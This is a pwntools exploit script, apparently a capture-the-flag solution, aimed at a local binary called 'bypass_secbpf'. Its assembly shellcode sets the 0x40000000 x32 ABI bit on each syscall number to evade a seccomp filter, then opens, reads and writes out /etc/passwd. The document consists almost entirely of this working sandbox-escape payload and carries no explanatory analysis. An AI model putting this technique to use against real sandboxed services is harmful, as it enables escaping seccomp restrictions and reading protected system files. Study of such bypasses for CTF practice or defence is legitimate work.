from pwn import *
context.arch = "amd64"
p = process("./bypass_secbpf")

#open("/etc/passwd", 0), read(0, "rsp", 0xffff), write(1, "rsp", 0xffff)
# "rsp": read into stack and write from stack.
# .asciz: Append a null terminator to the end of the string.
# write(): Just [add rax, 1] is occured error because of return value from read()
data = '''
        mov rax, 2 
        add rax, 0x40000000
        lea rdi, [rip+path] 
        xor rsi, rsi
        syscall
        mov rdi, rax
        mov rsi, rsp
        mov rdx, 0x1000
        mov rax, 0
        add rax, 0x40000000
        syscall
        mov rdi, 1
        mov rsi, rsp
        mov rax, 1
        add rax, 0x40000000
        syscall
        path: .asciz "/etc/passwd"
'''
p.sendline(asm(data))
p.interactive()